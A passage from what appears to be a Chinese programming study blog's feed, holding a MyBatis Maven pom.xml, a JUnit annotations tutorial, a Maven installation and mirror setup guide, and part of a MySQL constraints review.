class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.loong<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>MyBatis_Study<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--  &lt;name&gt;MyBatis_Study&lt;/name&gt;</span><br><span class="hljs-comment">  &amp;lt;!&amp;ndash; FIXME change it to the project&#x27;s website &amp;ndash;&amp;gt;</span><br><span class="hljs-comment">  &lt;url&gt;http://www.example.com&lt;/url&gt;--&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--  MyBatissss 依赖 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--   MySQL 驱动 --&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><span class="hljs-comment">&lt;!--所在的目录--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><span class="hljs-comment">&lt;!--包括目录下的 .properties.xml 文件都会扫描到--&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!--&lt;pluginManagement&gt;&amp;lt;!&amp;ndash; lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) &amp;ndash;&amp;gt;</span><br><span class="hljs-comment">      &lt;plugins&gt;</span><br><span class="hljs-comment">        &amp;lt;!&amp;ndash; clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle &amp;ndash;&amp;gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &amp;lt;!&amp;ndash; default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging &amp;ndash;&amp;gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;3.0.2&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;3.8.0&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;2.22.1&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;3.0.2&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;2.5.2&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;2.8.2&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &amp;lt;!&amp;ndash; site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle &amp;ndash;&amp;gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;3.7.1&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">        &lt;plugin&gt;</span><br><span class="hljs-comment">          &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt;</span><br><span class="hljs-comment">          &lt;version&gt;3.0.0&lt;/version&gt;</span><br><span class="hljs-comment">        &lt;/plugin&gt;</span><br><span class="hljs-comment">      &lt;/plugins&gt;</span><br><span class="hljs-comment">    &lt;/pluginManagement&gt;--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>MyBatis学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（二）JUnit基本使用</title>
    <link href="/2021/06/12/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%EF%BC%89JUnit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/06/12/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%EF%BC%89JUnit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>JUnit 是一个 Java 编程语言的单元测试框架。JUnit 在测试驱动的开发方面有很重要的发展，是起源于 JUnit 的一个统称为 xUnit 的单元测试框架之一。JUnit 促进了“先测试后编码”的理念，强调建立测试数据的一段代码，可以先测试，然后再应用。这个方法就好比“测试一点，编码一点，测试一点，编码一点……”，增加了程序员的产量和程序的稳定性，可以减少程序员的压力和花费在排错上的时间。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-使用说明"><a href="#1-使用说明" class="headerlink" title="1.使用说明"></a>1.使用说明</h2><h3 id="1-1-注意说明"><a href="#1-1-注意说明" class="headerlink" title="1.1 注意说明"></a>1.1 注意说明</h3><ol><li>测试方法必须使用 @Test 修饰</li><li>测试方法必须使用 public void 进行修饰，不能带参数</li><li>一般使用单元测试会新建一个 test 目录存放测试代码，在生产部署的时候只需要将 test 目录下代码删除即可</li><li>测试代码的包应该和被测试代码包结构保持一致</li><li>测试单元中的每个方法必须可以独立测试，方法间不能有任何依赖</li><li>测试类一般使用 Test 作为类名的后缀</li><li>测试方法使一般用 test 作为方法名的前缀</li></ol><h3 id="1-2-常用注解说明"><a href="#1-2-常用注解说明" class="headerlink" title="1.2 常用注解说明"></a>1.2 常用注解说明</h3><ol><li>@Test:将一个普通方法修饰成一个测试方法 @Test(excepted=xx.class): xx.class 表示异常类，表示测试的方法抛出此异常时，认为是正常的测试通过的 @Test(timeout = 毫秒数) :测试方法执行时间是否符合预期</li><li>@BeforeClass： 会在所有的方法执行前被执行，static 方法 （全局只会执行一次，而且是第一个运行）</li><li>@AfterClass：会在所有的方法执行之后进行执行，static 方法 （全局只会执行一次，而且是最后一个运行）</li><li>@Before：会在每一个测试方法被运行前执行一次</li><li>@After：会在每一个测试方法运行后被执行一次</li><li>@Ignore：所修饰的测试方法会被测试运行器忽略</li><li>@RunWith：可以更改测试运行器 org.junit.runner.Runner</li><li>@Parameters：参数化注解</li></ol><table><thead><tr><th align="center">序号</th><th align="center">注解</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><code>@Test</code></td><td align="center">这个注解说明依附在 JUnit 的 public void 方法可以作为一个测试案例。</td></tr><tr><td align="center">2</td><td align="center"><code>@Before </code></td><td align="center">有些测试在运行前需要创造几个相似的对象。在 public void 方法加该注解是因为该方法需要在 test 方法前运行。</td></tr><tr><td align="center">3</td><td align="center"><code>@After </code></td><td align="center">如果你将外部资源在 Before 方法中分配，那么你需要在测试运行后释放他们。在 public void 方法加该注解是因为该方法需要在 test 方法后运行。</td></tr><tr><td align="center">4</td><td align="center"><code>@BeforeClass </code></td><td align="center">在 public void 方法加该注解是因为该方法需要在类中所有方法前运行。</td></tr><tr><td align="center">5</td><td align="center"><code>@AfterClass </code></td><td align="center">它将会使方法在所有测试结束后执行。这个可以用来进行清理活动。</td></tr><tr><td align="center">6</td><td align="center"><code>@Ignore </code></td><td align="center">这个注解是用来忽略有关不需要执行的测试的。</td></tr></tbody></table><h3 id="1-3-常用方法"><a href="#1-3-常用方法" class="headerlink" title="1.3 常用方法"></a>1.3 常用方法</h3><p><strong>Assert</strong> 类中的一些有用的方法列式如下：</p><table><thead><tr><th align="center">序号</th><th align="center">方法</th><th>描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><code>void assertEquals(boolean expected, boolean actual)</code></td><td>检查两个变量或者等式是否平衡</td></tr><tr><td align="center">2</td><td align="center"><code>void assertTrue(boolean condition)</code></td><td>检查条件为真</td></tr><tr><td align="center">3</td><td align="center"><code>void assertFalse(boolean condition)</code></td><td>检查条件为假</td></tr><tr><td align="center">4</td><td align="center"><code>void assertNotNull(Object object)</code></td><td>检查对象不为空</td></tr><tr><td align="center">5</td><td align="center"><code>void assertNull(Object object)</code></td><td>检查对象为空</td></tr><tr><td align="center">6</td><td align="center"><code>void assertSame(Object expected, Object actual)</code> <code>assertSame()</code></td><td>方法检查两个相关对象是否指向同一个对象</td></tr><tr><td align="center">7</td><td align="center"><code>void assertNotSame(Object expected, Object actual)</code> <code>assertNotSame()</code></td><td>方法检查两个相关对象是否不指向同一个对象</td></tr><tr><td align="center">8</td><td align="center"><code>void assertArrayEquals(expectedArray, resultArray)</code> <code>assertArrayEquals()</code></td><td>方法检查两个数组是否相等</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（一）Maven搭建及配置</title>
    <link href="/2021/06/12/JavaWEB/JavaWEB-%EF%BC%88%E4%B8%80%EF%BC%89Maven%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/06/12/JavaWEB/JavaWEB-%EF%BC%88%E4%B8%80%EF%BC%89Maven%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>Maven是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。Maven 也可被用于构建和管理各种项目，例如 C#，Ruby，Scala 和其他语言编写的项目。Maven 曾是 Jakarta 项目的子项目，现为由 Apache 软件基金会主持的独立 Apache 项目。</p><p>Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-下载Maven"><a href="#1-下载Maven" class="headerlink" title="1.下载Maven"></a>1.下载Maven</h2><p>官网：<a href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p><h2 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h2><blockquote><ol><li>在系统变量中新建两个变量：<code>M2_HOME</code>、<code>MAVEN_HOME</code>。</li></ol></blockquote><p>其中，<br><code>M2_HOME</code>：路径为maven目录下一直至<code>bin</code>目录，如：D:\abc\abc\bin<br><code>MAVEN_HOME</code>：路径为上面的路径不要<code>bin</code>目录的路径，如：D:\abc\abc</p><blockquote><ol start="2"><li>设置系统的<code>path</code>变量</li></ol></blockquote><p>在系统变量中，找到<code>path</code>变量，然后编辑，新建一个：<code>%MAVEN_HOME%\bin</code> ，然后再一步步确定确定即可。</p><blockquote><ol start="3"><li>检测是否配置成功</li></ol></blockquote><p>打开 CMD 窗口，输入 <code>mvn -version</code>，看见版本等相关消息后即表示成功配置。</p><h2 id="3-配置镜像"><a href="#3-配置镜像" class="headerlink" title="3.配置镜像"></a>3.配置镜像</h2><blockquote><ol><li>在<code>maven</code>的安装目录下，打开<code>conf</code>目录，打开<code>settings.xml</code>文件。</li></ol></blockquote><blockquote><ol start="2"><li>找到<code>&lt;mirrors&gt;</code>，在<code>&lt;mirrors&gt;</code>中添加以下代码。需要注释掉之前其他的默认的镜像。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;mirror&gt;<br>           &lt;id&gt;nexus-aliyun&lt;/id&gt;<br>           &lt;mirrorOf&gt;*,!jeecg,!jeecg-snapshots&lt;/mirrorOf&gt;<br>           &lt;name&gt;Nexus aliyun&lt;/name&gt;<br>           &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; <br>&lt;/mirror&gt;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>在<code>maven</code>目录下（与bin在的目录中）新建一个文件夹 <code>maven-repo</code>。</li></ol></blockquote><blockquote><ol start="4"><li>在<code>settings.xml</code>文件中找到<code>settings</code>标签下面的<code>localRepository</code>注释后面，添加如下代码，注意路径换成自己的路径</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;localRepository&gt;E:\IDEAMaven\apache-maven-3.8.1\maven-repo&lt;/localRepository&gt;<br></code></pre></div></td></tr></table></figure><h2 id="4-在IDEA中使用Maven"><a href="#4-在IDEA中使用Maven" class="headerlink" title="4.在IDEA中使用Maven"></a>4.在IDEA中使用Maven</h2><blockquote><ol><li>在IDEA中创建一个Maven项目</li></ol></blockquote><blockquote><ol start="2"><li>在创建中，如遇到：<code>Maven home directory</code>、<code>User settings file</code>、<code>Local repository</code>，它们的填写如下。</li></ol></blockquote><p><code>Maven home directory</code>：maven的目录<br><code>User settings file</code>：maven目录下的conf下的settings.xml文件<br><code>Local repository</code>：maven目录下的maven-repo文件夹仓库（这个仓库为自己所创的那个）。</p><p>创建完成后，IDEA将自动导入相应的包。</p><p><strong>需要注意的是，每一次自己打开项目后都要看一下maven是否是自己的maven，而不是IDEA默认的maven。因为IDEA默认的maven是在C盘（如：C:\Users\DragonOne下有一个m2的文件夹，这个就是IDEA默认的）。</strong></p><p>查看当前项目的maven：File -&gt; settings -&gt; Build,Execution,Deployment -&gt; Build Tools -&gt; Maven 中可以看见。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL-MySQL知识复习（二）</title>
    <link href="/2021/06/05/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL-MySQL%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/06/05/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL-MySQL%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MySQL是一个关系型数据库管理系统。简单复习数据库MySQL知识。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-主键约束"><a href="#1-主键约束" class="headerlink" title="1.主键约束"></a>1.主键约束</h2><p>主键的取值不能为 NULL ，且取值唯一，不能重复。用关键字 primary key 标识，可以分为单一主键和复合主键，每一个数据表最多只能有一个主键约束。可以在创建表时创建，也可以对已存在的表添加主键。</p><h3 id="1-1-创建主键"><a href="#1-1-创建主键" class="headerlink" title="1.1 创建主键"></a>1.1 创建主键</h3><h4 id="1-1-创建表时创建主键"><a href="#1-1-创建表时创建主键" class="headerlink" title="1.1 创建表时创建主键"></a>1.1 创建表时创建主键</h4><h5 id="1-1-1-单一主键"><a href="#1-1-1-单一主键" class="headerlink" title="1.1.1 单一主键"></a>1.1.1 单一主键</h5><p>在表定义语句时，在其后面加上关键字 primary key。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">字段名 数据类型 primary key ;<br></code></pre></div></td></tr></table></figure><h5 id="1-1-2-复合主键"><a href="#1-1-2-复合主键" class="headerlink" title="1.1.2 复合主键"></a>1.1.2 复合主键</h5><p>在表定义语句最后，加上 primary key(字段名1，字段名2，····字段名n)。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">primary key (字段名1，字段名2，···，字段名n)<br></code></pre></div></td></tr></table></figure><h4 id="1-2-为已存在表创建主键"><a href="#1-2-为已存在表创建主键" class="headerlink" title="1.2 为已存在表创建主键"></a>1.2 为已存在表创建主键</h4><h5 id="1-2-1-单一主键"><a href="#1-2-1-单一主键" class="headerlink" title="1.2.1 单一主键"></a>1.2.1 单一主键</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 数据类型 primary key;<br></code></pre></div></td></tr></table></figure><h5 id="1-2-2-复合主键"><a href="#1-2-2-复合主键" class="headerlink" title="1.2.2 复合主键"></a>1.2.2 复合主键</h5><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 add primary key(字段名1，字段名2，···字段名n);<br></code></pre></div></td></tr></table></figure><h3 id="1-2-删除主键"><a href="#1-2-删除主键" class="headerlink" title="1.2 删除主键"></a>1.2 删除主键</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 drop primary key;<br></code></pre></div></td></tr></table></figure><h2 id="2-外键约束"><a href="#2-外键约束" class="headerlink" title="2.外键约束"></a>2.外键约束</h2><h3 id="2-1-创建外键"><a href="#2-1-创建外键" class="headerlink" title="2.1 创建外键"></a>2.1 创建外键</h3><h4 id="2-1-1-创建表时创建外键"><a href="#2-1-1-创建表时创建外键" class="headerlink" title="2.1.1 创建表时创建外键"></a>2.1.1 创建表时创建外键</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">foreign key(索引列名) references 表名(索引列名)<br></code></pre></div></td></tr></table></figure><p>在创建外键约束时，如果引用父表的参考字段没有设置主键或唯一键约束，则创建外键将会失败。</p><h4 id="2-1-2-为已存在的表添加外键"><a href="#2-1-2-为已存在的表添加外键" class="headerlink" title="2.1.2 为已存在的表添加外键"></a>2.1.2 为已存在的表添加外键</h4><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 add [constraint 约束名] foreign key(字段名) references 父表(字段名);<br></code></pre></div></td></tr></table></figure><p>constraint 为外键约束名，如果省略，系统自动会为外键定义一个外键名。</p><h4 id="2-1-3-创建外键注意点"><a href="#2-1-3-创建外键注意点" class="headerlink" title="2.1.3 创建外键注意点"></a>2.1.3 创建外键注意点</h4><ol><li>在创建表时创建外键，必须先创建父表，再创建子表。</li><li>必须为父表定义主键，父表名后面指定列名（或列名的组合）。这个列（或列组合）必须是这个表的主键或唯一键。</li><li>外键中的列数据类型必须和被参照表的主键中的数据类型一致或兼容，且含义一样。</li></ol><h3 id="2-2-删除外键"><a href="#2-2-删除外键" class="headerlink" title="2.2 删除外键"></a>2.2 删除外键</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 子表名 drop foreign key 外键名;<br></code></pre></div></td></tr></table></figure><p>如果创建外键时，没有指定外键名，则此处的外键名是系统指定的外键名。</p><h2 id="3-唯一性约束"><a href="#3-唯一性约束" class="headerlink" title="3.唯一性约束"></a>3.唯一性约束</h2><h3 id="3-1-创建唯一性约束"><a href="#3-1-创建唯一性约束" class="headerlink" title="3.1 创建唯一性约束"></a>3.1 创建唯一性约束</h3><h4 id="3-1-1-创建表时创建唯一性约束"><a href="#3-1-1-创建表时创建唯一性约束" class="headerlink" title="3.1.1 创建表时创建唯一性约束"></a>3.1.1 创建表时创建唯一性约束</h4><blockquote><ol><li>定义成列级完整性约束</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">字段名 数据类型 unique;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>定义成表级完整性约束</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">unique(字段名)<br></code></pre></div></td></tr></table></figure><h4 id="3-1-2-为已存在的表添加唯一性约束"><a href="#3-1-2-为已存在的表添加唯一性约束" class="headerlink" title="3.1.2 为已存在的表添加唯一性约束"></a>3.1.2 为已存在的表添加唯一性约束</h4><blockquote><ol><li>创建单一字段的唯一性约束</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 modify 字段名 数据类型 unique;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>创建多字段的唯一性约束，也可以用来创建单一字段的唯一性约束条件</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">alter table 表名 add [constraint 约束名] unique(字段名1，字段名2，···);<br></code></pre></div></td></tr></table></figure><h3 id="3-2-删除唯一性约束"><a href="#3-2-删除唯一性约束" class="headerlink" title="3.2 删除唯一性约束"></a>3.2 删除唯一性约束</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs 